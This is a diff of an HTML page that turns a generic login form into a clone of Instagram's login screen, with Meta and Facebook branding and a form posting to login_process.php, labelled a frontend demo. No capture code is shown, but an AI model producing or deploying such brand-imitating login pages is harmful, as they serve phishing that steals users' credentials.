@@ -1,44 +1,41 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Instagram UI Demo</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
-    <div id="wrapper">
-        <div class="main-content">
-            <div class="content">
-                <img src="logo.png" alt="Logo">
-            </div>
-            
-            <!-- Ditambahkan elemen <form> -->
-            <form action="login_process.php" method="POST">
-                <div>
-                    <!-- Ditambahkan atribut name="username" -->
-                    <input type="text" name="username" placeholder="Username" class="username" required>
-                    
-                    <div class="forget-text">
-                        <!-- Diubah type="password" dan ditambahkan name="password" -->
-                        <input type="password" name="password" placeholder="Password" class="password" required>
-                        <a href="#">Forgot?</a>
-                    </div>
-                    
-                    <!-- Diubah type="submit" dan ditambahkan name="submit" -->
-                    <input type="submit" name="submit" value="Log In" class="btn">
+    <main class="page">
+        <section class="promo">
+            <div class="ig-logo"><span class="lens"></span><span class="dot"></span></div>
+            <div class="headline">See everyday moments from<br>your <span>close friends.</span></div>
+            <div class="collage">
+                <div class="card left"></div>
+                <div class="card right"></div>
+                <div class="card front">
+                    <div class="story"></div>
                 </div>
-            </form>
-
-        </div>
-        <div class="sub-content">
-            <div class="sign-up">
-                Don't have an account? <a href="#">Sign up</a>
+                <div class="heart">♥</div>
+                <div class="spark">★</div>
             </div>
-        </div>
-    </div>
+        </section>
+        <section class="login-panel">
+            <div class="login-box">
+                <div class="title"><button>‹</button>
+                    <h1>Log into Instagram</h1>
+                </div>
+                <form action="login_process.php" method="POST"><input placeholder="Mobile number, username or email"><input
+                        type="password" placeholder="Password"><button class="login" type="submit">Log in</button>
+                </form><button class="forgot">Forgot password?</button><button class="facebook"><b>f</b> Log in with
+                    Facebook</button><button class="create">Create new account</button>
+                <div class="meta">∞ Meta</div><small>Frontend UI demo — no credentials are submitted.</small>
+            </div>
+        </section>
+    </main>
 </body>
+
 </html>
